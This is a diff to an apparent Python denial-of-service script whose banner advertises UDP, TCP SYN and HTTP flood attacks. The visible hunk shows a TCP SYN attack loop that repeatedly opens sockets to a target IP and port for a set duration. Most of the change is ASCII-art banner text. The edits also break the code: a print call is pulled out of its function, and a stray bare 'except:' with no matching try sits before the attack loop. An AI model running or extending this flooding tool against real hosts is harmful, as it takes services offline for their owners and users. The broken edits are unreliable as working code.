@@ -14,12 +14,19 @@ colorama.init(autoreset=True)
 
 def display_banner(): #logo program.
     banner_text = f"""
-{Fore.LIGHTYELLOW_EX}
- ...
+{Fore.LIGHTYELLOW_EX}▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒┌───╮▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╭╮▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▒▒└────╮╭───╮▒┌───╮▒╭───╮▒││▒▒╭╮▒▒╭────╮╭╮▒▒▒╭╮╭╮╭──╮▒╭╮▒▒▒╭╮╭╮▒▒
+▒▒▒▒▒▒▒│││╭───╮└────╮╰────╮││▒╭╯|▒▒│╭───╯││▒▒▒│││╰╯╭──╮││▒▒▒││││▒▒
+▒▒▒▒▒▒▒│││╰──╯│▒▒▒▒││╭───╯││╰─╯╭╯▒▒│╰───╮││▒▒▒│││╭─╯▒││││▒▒▒││││▒▒
+▒▒╭╮▒▒▒│││┌───╯▒▒▒▒│││╭──╮││╭─╮╰╮▒▒╰───╮|││▒▒▒││││▒▒▒│││╰───╯│││▒▒
+▒▒|╰────╯|╰──╮╭╮▒▒▒││╰───╯|││▒╰╮|▒▒╭────╯│╰────╯││▒▒▒││╰────╮│││▒▒
+▒▒╰────╯▒╰───╯|╰────╯▒╰───╯╰╯▒▒╰╯▒▒╰───╯▒╰────╯▒╰╯▒▒▒╰╯╭─────╯╰╯▒▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒╰────╯▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╰────╯▒▒▒▒▒
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
                           {Fore.LIGHTRED_EX}UDP DoS | TCP SYN | HTTP Flood
 """
-    print(banner_text)
-
+print(banner_text)
 def parse_arguments(): 
     # Mengurai dan memvalidasi argumen baris perintah.
     if len(sys.argv) != 5:
@@ -69,6 +76,7 @@ def tcp_syn_attack(target_ip, target_port, duration):
     packets_sent = 0
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
+except: 
     while time.time() < end_time:
         tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
